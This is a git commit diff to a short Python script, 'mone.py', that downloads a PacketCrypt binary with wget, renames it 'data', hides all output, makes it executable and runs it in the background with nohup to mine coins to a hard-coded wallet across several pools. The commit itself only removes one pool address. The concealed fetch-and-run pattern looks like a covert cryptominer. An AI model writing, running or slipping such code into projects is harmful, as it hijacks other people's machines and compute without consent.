031e255d37cd2b685dfbc87b7faf40d516c2535c
Geraldy Olang <97717251+gyrogerald@users.noreply.github.com>
2022-02-21 19:05:06 +0800

    Update mone.py

--- mone.py
+++ mone.py
@@ -1,4 +1,4 @@
 import os
 cmd = os.system('wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 -O data >/dev/null 2>&1')
 cmd = os.system('chmod +x data >/dev/null 2>&1')
-cmd = os.system('nohup ./data ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > nohup.out')
+cmd = os.system('nohup ./data ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world http://pool.pktpool.io > nohup.out')
